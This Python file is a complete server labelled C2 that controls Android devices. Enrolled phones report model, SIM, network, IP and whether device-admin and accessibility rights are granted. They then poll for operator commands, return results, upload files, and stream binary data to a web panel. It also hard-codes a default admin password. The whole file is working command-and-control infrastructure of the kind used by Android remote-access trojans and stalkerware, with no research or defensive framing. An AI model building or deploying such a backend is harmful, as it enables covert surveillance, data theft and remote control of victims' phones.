import asyncio
import contextlib
import hashlib
import hmac
import json
import mimetypes
import os
import secrets
import ssl
import time

import aiosqlite
from aiohttp import WSMsgType, web

HOST = os.environ.get("C2_HOST", "0.0.0.0")
# Render/Heroku-style platforms inject $PORT. Fall back to C2_PORT, then 8443.
PORT = int(os.environ.get("PORT") or os.environ.get("C2_PORT") or "8443")
ADMIN_USER = os.environ.get("C2_ADMIN", "admin")
ADMIN_PASS = os.environ.get("C2_PASS", "Prshil@123")
DEVICE_SECRET = os.environ.get("C2_DEVICE_SECRET", "sim1-shared-secret-change-me")
DB_PATH = os.environ.get("C2_DB", "sim1.db")
TLS_CERT = os.environ.get("C2_CERT", "")
TLS_KEY = os.environ.get("C2_KEY", "")
# Comma-separated allowlist of panel origins. "*" reflects any Origin (default).
CORS_ORIGINS = os.environ.get("C2_ORIGINS", "*")

STREAM_ROOMS = {}
DEVICE_SOCKETS = {}


def client_ip(request: web.Request) -> str:
    xff = request.headers.get("X-Forwarded-For", "")
    if xff:
        return xff.split(",")[0].strip()
    fwd = request.headers.get("X-Real-IP", "")
    return fwd or (request.remote or "")


def _origin_ok(origin: str) -> str:
    if not origin:
        return ""
    if CORS_ORIGINS == "*":
        return origin
    allowed = [o.strip() for o in CORS_ORIGINS.split(",") if o.strip()]
    return origin if origin in allowed else ""


@web.middleware
async def cors_mw(request, handler):
    resp = await handler(request)
    origin = _origin_ok(request.headers.get("Origin", ""))
    if origin:
        resp.headers["Access-Control-Allow-Origin"] = origin
        resp.headers["Access-Control-Allow-Credentials"] = "true"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, X-Admin-Token, X-Sim1-Auth"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, DELETE, OPTIONS"
        resp.headers["Access-Control-Max-Age"] = "86400"
        resp.headers["Vary"] = "Origin"
    return resp


async def preflight(request):
    return web.Response(status=204)


app = web.Application(client_max_size=64 * 1024 * 1024, middlewares=[cors_mw])


def sign_device(device_id: str) -> str:
    return hmac.new(DEVICE_SECRET.encode(), device_id.encode(), hashlib.sha256).hexdigest()


def device_auth(request: web.Request, device_id: str) -> bool:
    got = request.headers.get("X-Sim1-Auth", "")
    return hmac.compare_digest(got, sign_device(device_id))


@contextlib.asynccontextmanager
async def db():
    conn = await aiosqlite.connect(DB_PATH)
    conn.row_factory = aiosqlite.Row
    try:
        yield conn
    finally:
        await conn.close()


async def init_db():
    async with db() as c:
        await c.executescript(
            """
            CREATE TABLE IF NOT EXISTS devices(
                id TEXT PRIMARY KEY, name TEXT, model TEXT, brand TEXT,
                android_ver TEXT, sdk INTEGER, sim TEXT, battery REAL,
                network TEXT, ip TEXT, last_seen REAL, first_seen REAL,
                admin INTEGER DEFAULT 0, a11y INTEGER DEFAULT 0,
                stream INTEGER DEFAULT 0, note TEXT DEFAULT '');
            CREATE TABLE IF NOT EXISTS commands(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT, type TEXT, args TEXT,
                status TEXT DEFAULT 'queued',
                result TEXT, created REAL, done REAL);
            CREATE TABLE IF NOT EXISTS files(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT, name TEXT, data BLOB, created REAL);
            """
        )
        await c.commit()


def token_path():
    return os.path.join(os.path.dirname(os.path.abspath(DB_PATH)), ".admin_tokens")


def admin_token(request: web.Request):
    tok = request.cookies.get("sim1_admin") or request.headers.get("X-Admin-Token", "")
    if not tok:
        return None
    try:
        with open(token_path()) as f:
            if tok in f.read().split():
                return tok
    except OSError:
        return None
    return None


def mint_admin_token():
    tok = secrets.token_urlsafe(32)
    with open(token_path(), "a") as f:
        f.write(tok + "\n")
    return tok


async def login(request):
    data = await request.post()
    user = data.get("user", "")
    pw = data.get("pass", "")
    if user == ADMIN_USER and hmac.compare_digest(pw, ADMIN_PASS):
        tok = mint_admin_token()
        resp = web.Response(text=json.dumps({"ok": True, "token": tok}))
        resp.set_cookie("sim1_admin", tok, httponly=True,
                        secure=bool(TLS_CERT and TLS_KEY), samesite="Strict")
        return resp
    await asyncio.sleep(0.6)
    return web.json_response({"ok": False}, status=401)


async def logout(request):
    resp = web.Response(text=json.dumps({"ok": True}))
    resp.del_cookie("sim1_admin")
    return resp


def require_admin(handler):
    async def wrap(request):
        if not admin_token(request):
            return web.json_response({"ok": False, "err": "auth"}, status=401)
        return await handler(request)

    return wrap


# ---------------- device side ----------------

async def register(request):
    body = await request.json()
    device_id = body.get("id") or secrets.token_hex(8)
    if not device_auth(request, device_id):
        return web.json_response({"ok": False, "err": "auth"}, status=401)
    now = time.time()
    async with db() as c:
        await c.execute(
            """INSERT INTO devices(id,name,model,brand,android_ver,sdk,sim,battery,network,ip,last_seen,first_seen,admin,a11y,stream)
               VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
               ON CONFLICT(id) DO UPDATE SET name=excluded.name,model=excluded.model,brand=excluded.brand,
               android_ver=excluded.android_ver,sdk=excluded.sdk,sim=excluded.sim,battery=excluded.battery,
               network=excluded.network,ip=excluded.ip,last_seen=excluded.last_seen,admin=excluded.admin,
               a11y=excluded.a11y,stream=excluded.stream""",
             (device_id, body.get("name"), body.get("model"), body.get("brand"),
             body.get("android"), body.get("sdk"), body.get("sim"),
             body.get("battery", 0), body.get("network", ""), client_ip(request),
             now, now, int(bool(body.get("admin"))), int(bool(body.get("a11y"))),
             int(bool(body.get("stream")))))
        await c.commit()
    return web.json_response({"ok": True, "id": device_id})


async def heartbeat(request):
    body = await request.json()
    device_id = body.get("id", "")
    if not device_auth(request, device_id):
        return web.json_response({"ok": False}, status=401)
    now = time.time()
    async with db() as c:
        await c.execute(
            """UPDATE devices SET battery=?,network=?,ip=?,last_seen=?,admin=?,a11y=?,stream=? WHERE id=?""",
            (body.get("battery", 0), body.get("network", ""), client_ip(request), now,
             int(bool(body.get("admin"))), int(bool(body.get("a11y"))),
             int(bool(body.get("stream"))), device_id))
        await c.commit()
    return web.json_response({"ok": True})


async def poll(request):
    body = await request.json()
    device_id = body.get("id", "")
    if not device_auth(request, device_id):
        return web.json_response({"ok": False}, status=401)
    async with db() as c:
        cur = await c.execute(
            "SELECT * FROM commands WHERE device_id=? AND status='queued' ORDER BY id LIMIT 5",
            (device_id,))
        rows = await cur.fetchall()
        cmds = []
        for r in rows:
            await c.execute("UPDATE commands SET status='sent' WHERE id=?", (r["id"],))
            cmds.append({"cid": r["id"], "type": r["type"], "args": json.loads(r["args"] or "{}")})
        await c.commit()
    return web.json_response({"ok": True, "cmds": cmds})


async def result(request):
    body = await request.json()
    device_id = body.get("id", "")
    if not device_auth(request, device_id):
        return web.json_response({"ok": False}, status=401)
    cid = body.get("cid")
    async with db() as c:
        await c.execute(
            "UPDATE commands SET status='done', result=?, done=? WHERE id=? AND device_id=?",
            (json.dumps(body.get("result")), time.time(), cid, device_id))
        await c.commit()
    return web.json_response({"ok": True})


async def upload(request):
    device_id = request.match_info["device_id"]
    if not device_auth(request, device_id):
        return web.json_response({"ok": False}, status=401)
    data = await request.read()
    name = request.query.get("name", "file.bin")
    name = os.path.basename(name)
    async with db() as c:
        await c.execute("INSERT INTO files(device_id,name,data,created) VALUES(?,?,?,?)",
                        (device_id, name, data, time.time()))
        await c.commit()
    return web.json_response({"ok": True})


# ---------------- admin side ----------------

@require_admin
async def a_devices(request):
    async with db() as c:
        cur = await c.execute(
            "SELECT id,name,model,brand,android_ver,sdk,sim,battery,network,ip,last_seen,first_seen,admin,a11y,stream,note FROM devices ORDER BY last_seen DESC")
        rows = await cur.fetchall()
    now = time.time()
    out = []
    for r in rows:
        d = dict(r)
        d["online"] = now - (r["last_seen"] or 0) < 45
        out.append(d)
    return web.json_response({"ok": True, "devices": out})


@require_admin
async def a_send(request):
    body = await request.json()
    device_id = body.get("device_id")
    ctype = body.get("type")
    args = body.get("args", {})
    if not device_id or not ctype:
        return web.json_response({"ok": False, "err": "bad"}, status=400)
    async with db() as c:
        cur = await c.execute("INSERT INTO commands(device_id,type,args,created) VALUES(?,?,?,?)",
                              (device_id, ctype, json.dumps(args), time.time()))
        await c.commit()
        cid = cur.lastrowid
    return web.json_response({"ok": True, "cid": cid})


@require_admin
async def a_cmdlog(request):
    device_id = request.query.get("device_id", "")
    async with db() as c:
        cur = await c.execute(
            "SELECT id,type,args,status,result,created,done FROM commands WHERE device_id=? ORDER BY id DESC LIMIT 100",
            (device_id,))
        rows = await cur.fetchall()
    return web.json_response({"ok": True, "cmds": [dict(r) for r in rows]})


@require_admin
async def a_files(request):
    device_id = request.query.get("device_id", "")
    async with db() as c:
        cur = await c.execute(
            "SELECT id,name,length(data) AS size,created FROM files WHERE device_id=? ORDER BY id DESC",
            (device_id,))
        rows = await cur.fetchall()
    return web.json_response({"ok": True, "files": [dict(r) for r in rows]})


@require_admin
async def a_file_get(request):
    fid = request.match_info["fid"]
    async with db() as c:
        cur = await c.execute("SELECT name,data FROM files WHERE id=?", (fid,))
        row = await cur.fetchone()
    if not row:
        return web.Response(status=404)
    name = row["name"] or "file"
    ctype = mimetypes.guess_type(name)[0] or "application/octet-stream"
    headers = {"Content-Type": ctype}
    if not request.query.get("inline"):
        headers["Content-Disposition"] = 'attachment; filename="%s"' % name
    return web.Response(body=row["data"], headers=headers)


@require_admin
async def a_delete_device(request):
    device_id = request.match_info["device_id"]
    async with db() as c:
        await c.execute("DELETE FROM devices WHERE id=?", (device_id,))
        await c.execute("DELETE FROM commands WHERE device_id=?", (device_id,))
        await c.execute("DELETE FROM files WHERE device_id=?", (device_id,))
        await c.commit()
    return web.json_response({"ok": True})


@require_admin
async def a_note(request):
    body = await request.json()
    async with db() as c:
        await c.execute("UPDATE devices SET note=? WHERE id=?",
                        (body.get("note", ""), body.get("device_id")))
        await c.commit()
    return web.json_response({"ok": True})


# ---------------- stream relay ----------------

async def stream_ws(request):
    kind = request.match_info["kind"]
    role = request.query.get("role", "")
    device_id = request.match_info["device_id"]

    if role == "device":
        if not device_auth(request, device_id):
            return web.Response(status=401)
        ws = web.WebSocketResponse(max_msg_size=64 * 1024 * 1024)
        await ws.prepare(request)
        DEVICE_SOCKETS[(device_id, kind)] = ws
        room = STREAM_ROOMS.setdefault((device_id, kind), set())
        try:
            async for msg in ws:
                if msg.type == WSMsgType.BINARY:
                    for viewer in list(room):
                        try:
                            await viewer.send_bytes(msg.data)
                        except Exception:
                            room.discard(viewer)
                elif msg.type in (WSMsgType.CLOSE, WSMsgType.ERROR):
                    break
        finally:
            r = STREAM_ROOMS.get((device_id, kind))
            if r is not None:
                r.discard(ws)
            if DEVICE_SOCKETS.get((device_id, kind)) is ws:
                DEVICE_SOCKETS.pop((device_id, kind), None)
        return ws

    if not admin_token(request):
        return web.Response(status=401)
    ws = web.WebSocketResponse(max_msg_size=64 * 1024 * 1024)
    await ws.prepare(request)
    room = STREAM_ROOMS.setdefault((device_id, kind), set())
    room.add(ws)
    try:
        async for msg in ws:
            if msg.type in (WSMsgType.CLOSE, WSMsgType.ERROR):
                break
    finally:
        r = STREAM_ROOMS.get((device_id, kind))
        if r is not None:
            r.discard(ws)
            if not r:
                dev = DEVICE_SOCKETS.get((device_id, kind))
                if dev is not None:
                    try:
                        await dev.send_str(json.dumps({"ctl": "viewer_gone", "kind": kind}))
                    except Exception:
                        pass
    return ws


async def index(request):
    resp = web.FileResponse(os.path.join(os.path.dirname(os.path.abspath(__file__)), "panel.html"))
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    return resp


async def health(request):
    return web.json_response({"ok": True, "ts": time.time()})


app.router.add_get("/healthz", health)
app.router.add_route("OPTIONS", "/{tail:.*}", preflight)
app.router.add_get("/", index)
app.router.add_post("/api/login", login)
app.router.add_post("/api/logout", logout)
app.router.add_post("/api/register", register)
app.router.add_post("/api/heartbeat", heartbeat)
app.router.add_post("/api/poll", poll)
app.router.add_post("/api/result", result)
app.router.add_post("/api/upload/{device_id}", upload)
app.router.add_get("/api/devices", a_devices)
app.router.add_post("/api/cmd", a_send)
app.router.add_get("/api/cmdlog", a_cmdlog)
app.router.add_get("/api/files", a_files)
app.router.add_get("/api/file/{fid}", a_file_get)
app.router.add_delete("/api/device/{device_id}", a_delete_device)
app.router.add_post("/api/note", a_note)
app.router.add_get("/ws/stream/{device_id}/{kind}", stream_ws)

if __name__ == "__main__":
    asyncio.run(init_db())
    ssl_ctx = None
    if TLS_CERT and TLS_KEY:
        # Local/self-hosted TLS only. Render terminates TLS at its edge, so leave
        # C2_CERT/C2_KEY unset there and serve plain HTTP on $PORT.
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(TLS_CERT, TLS_KEY)
    web.run_app(app, host=HOST, port=PORT, ssl_context=ssl_ctx)
